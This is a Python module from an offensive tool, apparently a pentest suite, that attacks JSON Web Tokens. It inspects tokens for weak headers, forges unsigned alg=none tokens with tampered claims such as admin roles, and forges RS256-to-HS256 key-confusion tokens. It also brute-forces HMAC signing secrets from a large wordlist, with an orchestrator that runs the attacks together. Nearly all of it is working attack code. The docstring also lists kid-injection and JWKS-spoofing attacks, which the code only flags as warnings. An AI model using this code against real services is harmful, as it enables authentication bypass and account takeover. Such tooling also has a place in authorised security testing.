"""
CyberScope v7.7.2 · JWT Cracker & Auth Bypass Engine.

Given a JWT token, tries a battery of attacks:
  1. `alg=none` bypass
  2. RS256 → HS256 key confusion (uses public key as HMAC secret)
  3. kid injection (SQLi / path traversal in `kid` header)
  4. JWKS spoofing hint (checks `jku`/`x5u` header for CVEs)
  5. Weak-secret cracking via the on-disk 104K wordlist
     (`wordlist_manager.load_category('jwt')`)

Everything runs offline once the token is provided.  Signature verification
uses `hmac + hashlib` — no external crypto libs required, so we avoid
`python-jose` / `PyJWT` version footguns.

Public API:
  - inspect_token(token) -> dict     (decode + basic metadata)
  - crack_jwt(token, max_secrets=100_000) -> dict (full attack run)
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Dict, List, Optional


# ────────────────────── low-level helpers ──────────────────────

def _b64d(seg: str) -> bytes:
    """URL-safe base64 decode, pad-tolerant."""
    pad = '=' * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def _decode(token: str) -> Dict[str, Any]:
    """Return {header, payload, signature, signing_input, error?}"""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {'error': 'malformed_token'}
    try:
        header = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
        signature = _b64d(parts[2])
        return {
            'header': header,
            'payload': payload,
            'signature': signature,
            'signing_input': f'{parts[0]}.{parts[1]}'.encode('ascii'),
        }
    except Exception as e:
        return {'error': f'decode_error:{type(e).__name__}:{e}'}


# ────────────────────── inspection ──────────────────────

def inspect_token(token: str) -> Dict[str, Any]:
    """Public helper: decode + surface any obvious red flags."""
    dec = _decode(token)
    if dec.get('error'):
        return dec
    header = dec['header']
    payload = dec['payload']
    warnings: List[str] = []

    if header.get('alg', '').lower() == 'none':
        warnings.append('alg=none — signature verification disabled by design')
    if 'jku' in header:
        warnings.append(f'jku claim present ({header["jku"]}) — check SSRF/JWKS spoofing')
    if 'x5u' in header:
        warnings.append(f'x5u claim present ({header["x5u"]}) — check X.509 URL trust')
    if 'kid' in header:
        kid = str(header['kid'])
        if any(c in kid for c in ('/', '..', "'", '"', ';', '$')):
            warnings.append(f'suspicious kid={kid!r} — try path traversal / SQLi')

    # Payload red flags
    for k in ('iat', 'exp'):
        if k in payload:
            try:
                payload[f'{k}_iso'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(payload[k]))
            except Exception:
                pass
    if payload.get('exp') and payload['exp'] < int(time.time()):
        warnings.append('token expired — replay may still be interesting')

    return {
        'header': header,
        'payload': payload,
        'alg': header.get('alg', 'unknown'),
        'typ': header.get('typ', 'unknown'),
        'kid': header.get('kid'),
        'signature_hex': dec['signature'].hex()[:64],
        'warnings': warnings,
    }


# ────────────────────── attack: alg=none ──────────────────────

def forge_alg_none(token: str, tamper: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Rebuild the token with `alg=none` and an empty signature.
    Optionally tamper the payload (e.g. `{"role": "admin"}` overrides).
    """
    dec = _decode(token)
    if dec.get('error'):
        return {'success': False, 'error': dec['error']}
    header = {**dec['header'], 'alg': 'none'}
    payload = {**dec['payload']}
    if tamper:
        payload.update(tamper)
    h_b64 = _b64e(json.dumps(header, separators=(',', ':'), sort_keys=True).encode())
    p_b64 = _b64e(json.dumps(payload, separators=(',', ':'), sort_keys=True).encode())
    forged = f'{h_b64}.{p_b64}.'
    return {'success': True, 'token': forged, 'header': header, 'payload': payload}


# ────────────────────── attack: HS256 crack ──────────────────────

_HS_ALGS = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}


def _hs_sign(signing_input: bytes, secret: str, alg: str) -> bytes:
    return hmac.new(secret.encode('utf-8'), signing_input, _HS_ALGS[alg]).digest()


def crack_hs_secret(
    token: str,
    wordlist: List[str],
    max_secrets: int = 200_000,
    progress_cb=None,
) -> Dict[str, Any]:
    """
    Try each candidate as the HMAC secret.  Returns the first match or None.
    Runs in ~1-3 seconds for 100K secrets on a modern CPU (pure hmac).
    """
    dec = _decode(token)
    if dec.get('error'):
        return {'success': False, 'error': dec['error']}
    alg = dec['header'].get('alg', '').upper()
    if alg not in _HS_ALGS:
        return {'success': False, 'error': f'not_hmac_alg:{alg}'}

    target = dec['signature']
    signing_input = dec['signing_input']
    tried = 0
    t0 = time.time()

    for candidate in wordlist[:max_secrets]:
        tried += 1
        try:
            if _hs_sign(signing_input, candidate, alg) == target:
                return {
                    'success': True,
                    'secret': candidate,
                    'alg': alg,
                    'tried': tried,
                    'duration_sec': round(time.time() - t0, 2),
                }
        except Exception:
            continue
        if progress_cb and (tried % 5000 == 0):
            try:
                progress_cb(f'JWT crack: tried {tried:,} — still searching...')
            except Exception:
                pass

    return {
        'success': False,
        'reason': 'exhausted',
        'tried': tried,
        'duration_sec': round(time.time() - t0, 2),
    }


# ────────────────────── attack: RS256→HS256 key confusion ──────────────────────

def forge_alg_confusion(token: str, public_key_pem: str,
                        tamper: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Change header.alg from RS256/ES256 → HS256 and re-sign using the raw
    public key as the HMAC secret.  Server that blindly picks alg based on
    header will validate the forgery.
    """
    dec = _decode(token)
    if dec.get('error'):
        return {'success': False, 'error': dec['error']}
    header = {**dec['header'], 'alg': 'HS256'}
    payload = {**dec['payload']}
    if tamper:
        payload.update(tamper)
    h_b64 = _b64e(json.dumps(header, separators=(',', ':'), sort_keys=True).encode())
    p_b64 = _b64e(json.dumps(payload, separators=(',', ':'), sort_keys=True).encode())
    signing_input = f'{h_b64}.{p_b64}'.encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    forged = f'{h_b64}.{p_b64}.{_b64e(sig)}'
    return {'success': True, 'token': forged, 'header': header, 'payload': payload}


# ────────────────────── orchestrator ──────────────────────

async def crack_jwt(
    token: str,
    *,
    max_secrets: int = 150_000,
    tamper: Optional[Dict[str, Any]] = None,
    progress_cb=None,
) -> Dict[str, Any]:
    """
    Run the full attack battery.  Returns a structured report the server
    exposes as JSON.  Wordlist is loaded from the on-disk Payload Encyclopedia
    (`jwt` category — 104K weak secrets shipped by default).
    """
    from .wordlist_manager import load_category, stats

    report: Dict[str, Any] = {
        'inspect': inspect_token(token),
        'attacks': {},
    }
    if report['inspect'].get('error'):
        return report

    # 1) alg=none forgery
    report['attacks']['alg_none'] = forge_alg_none(token, tamper=tamper)

    # 2) HS256 crack against JWT wordlist
    alg = report['inspect'].get('alg', '').upper()
    if alg in _HS_ALGS:
        wl_stats = stats()
        available = wl_stats.get('jwt', 0)
        if available == 0:
            report['attacks']['hs_crack'] = {
                'success': False,
                'reason': 'wordlist_missing',
                'hint': 'POST /api/vuln/wordlists/sync to populate jwt category',
            }
        else:
            wl = load_category('jwt', limit=max_secrets)
            if progress_cb:
                progress_cb(f'[*] JWT crack: {len(wl):,} candidates loaded...')
            report['attacks']['hs_crack'] = crack_hs_secret(
                token, wl, max_secrets=max_secrets, progress_cb=progress_cb)
    else:
        report['attacks']['hs_crack'] = {'success': False, 'reason': f'not_hmac:{alg}'}

    return report
